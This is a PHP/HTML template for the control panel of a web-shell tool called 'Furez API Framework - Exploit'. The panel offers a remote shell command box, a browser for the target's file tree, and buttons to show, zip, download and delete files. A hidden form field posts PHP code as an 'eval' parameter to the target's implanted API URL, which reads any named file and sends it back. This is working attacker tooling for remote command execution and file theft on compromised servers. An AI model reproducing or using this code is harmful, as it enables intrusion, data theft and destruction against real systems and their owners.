<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Furez API Framework - Exploit</title>
		<link rel="stylesheet" type="text/css" href="ressource/css/bootstrap.min.css">
		<link rel="stylesheet" type="text/css" href="ressource/css/font-awesome.min.css">
		<link rel="stylesheet" type="text/css" href="ressource/css/style.css">
		<link rel="shortcut icon" type="image/x-icon" href="ressource/img/favicon.ico">
	</head>
	<body>
		<div class="container">
			<header>
				<div class="row">
					<div class="col-xs-12">
						<div class="page-header text-center">
							<img src="ressource/img/logo.png" alt="Furez logo" height="250px">
							<div>
								<em>Furez API Framework<br>
								"The game is not about becoming somebody, it's about becoming nobody."</em>
							</div>
						</div>
					</div>
				</div>
			</header>

			<div class="row">
				<div class="col-xs-12">
					<a class="btn btn-info btn-small" href="<?php echo($this->router->generate('config')) ?>">Config</a>
					<a class="btn btn-danger btn-small" href="<?php echo($this->router->generate('reloadBundle')) ?>">Reload Bundle</a>
					<span>Current API Url = <a href="<?php echo($_SESSION['apiurl']) ?>" target="_blank"><?php echo($_SESSION['apiurl']) ?></a></span>
				</div>
			</div>

			<section>
				<div class="row">
					<div class="col-xs-12">
						<h2>Shell</h2>
					</div>
				</div>
				<div class="row">
					<div class="col-xs-12">
						<form class="form" id="uTerminalForm">
							<div class="form-group">
								<div class="input-group">
									<div class="input-group-addon"><?php echo($cur_dir) ?> > </div>
									<input type="text" class="form-control uInput-text" id="terminal" name="cmd" placeholder="your command">
							    </div>
							    <div class="uTerminal">
								</div>
							</div>
						</form>
						<span class="label label-primary pull-right">Running as: <?php echo($identity) ?></span>
					</div>
				</div>
			</section>

			<section>
				<div class="row">
					<div class="col-xs-12">
						<h2>Folder Structure</h2>
					</div>
				</div>
				<div class="row row-eq-height">
					<div class="col-xs-8">
						<div class="uFolderStructure">
							<h3><?php echo($context) ?> (<?php echo($total) ?>)</h3>
							<ul class="uSiteMap">
								<?php echo($folder_structure) ?>
							</ul>
						</div>
					</div>
					<div class="col-xs-4">
						<nav class="uActionNav">
							<div class="row text-center">
								<div class="col-xs-12">
									<p id="uActiveObj" data-context="">No file or folder selected</p>
									<div id="uActiveObjInfo">
									</div>
								</div>
							</div>
							<div class="row text-center">
								<button disabled id="showFile" class="btn btn1 btn-info">Show</button>
								<button disabled id="zipFile" class="btn btn2 btn-warning">Zip</button>
                                <form style="display: inline" action="<?php echo($_SESSION['apiurl']) ?>" method="post">
                                    <input name="eval" type="hidden" value="if (file_exists($_POST['file'])) {
                                    header('Content-Description: File Transfer');
                                    header('Content-Type: application/octet-stream');
                                    header('Content-Disposition: attachment; filename='.basename($_POST['file']));
                                    header('Content-Transfer-Encoding: binary');
                                    header('Expires: 0');
                                    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
                                    header('Pragma: public');
                                    header('Content-Length: ' . filesize($_POST['file']));
                                    ob_clean();
                                    flush();
                                    readfile($_POST['file']);
                                    exit;
                                    }">
                                    <input type="hidden" id="downloadFilename" name="file" value="">
                                    <input disabled type="submit" id="downloadFile" class="btn btn3 btn-success" value="Download">
                                </form>
								<button disabled id="deleteFile" class="btn btn4 btn-danger">Delete</button>
							</div>
						</nav>
					</div>
				</div>
			</section>

            <?php
                foreach($_SESSION['bundles_views'] as $view) {
                    if(is_array($view)) {
                        foreach($view as $single) {
                            include_once('bundle-cut/'.$single.'.php');
                        }
                    } else {
                        include_once('bundle-cut/'.$view.'.php');
                    }
                }
            ?>

		</div>

        <div id="footer">
            <div class="container">
                <p class="text-muted">Furez Api Framework @ProvideUp by InnovativeHack, Gesafellsky</p>
            </div>
        </div>

		<div class="modal fade modal-dark" tabindex="-1" role="dialog" id="catFile">
			<div class="modal-dialog">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
						<h4 class="modal-title">Fichier</h4>
					</div>

					<div class="modal-body">
					</div>

					<div class="modal-footer">
						<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
					</div>
				</div>
			</div>
		</div>

        <div class="modal fade" tabindex="-1" role="dialog" id="failure">
            <div class="modal-dialog">
                <div class="modal-body">
                    <div class="alert alert-danger alert-dismissible text-center" role="alert">
                        <button type="button" class="close" data-dismiss="modal"  aria-label="Close"><span aria-hidden="true">&times;</span></button>
                        <p id="failureText"></p>
                    </div>
                </div>
            </div>
        </div>

        <div class="modal fade" tabindex="-1" role="dialog" id="success">
            <div class="modal-dialog">
                <div class="modal-body">
                    <div class="alert alert-success alert-dismissible text-center" role="alert">
                        <button type="button" class="close" data-dismiss="modal"  aria-label="Close"><span aria-hidden="true">&times;</span></button>
                        <p id="successText"></p>
                    </div>
                </div>
            </div>
        </div>

		<script type="text/javascript" src="ressource/js/jquery-2.2.0.min.js"></script>
		<script type="text/javascript" src="ressource/js/bootstrap.min.js"></script>
		<script type="text/javascript">
            <?php if($flash) : ?>
                $('#<?php echo($flash[0]) ?>Text').text("<?php echo($flash[1]) ?>");
                $('#<?php echo($flash[0]) ?>').modal('show');
            <?php endif; ?>
			var thisUrl = "<?php echo($this->router->generate('index')) ?>";
			var curDir = "<?php echo(str_replace('\\', '/', $cur_dir)) ?>";
			var contextRacine = "<?php echo(str_replace('\\', '/', $context)) ?>"
		</script>
		<script type="text/javascript" src="ressource/js/main.js"></script>
		<script type="text/javascript" src="ressource/js/submit.js"></script>
	</body>
</html>
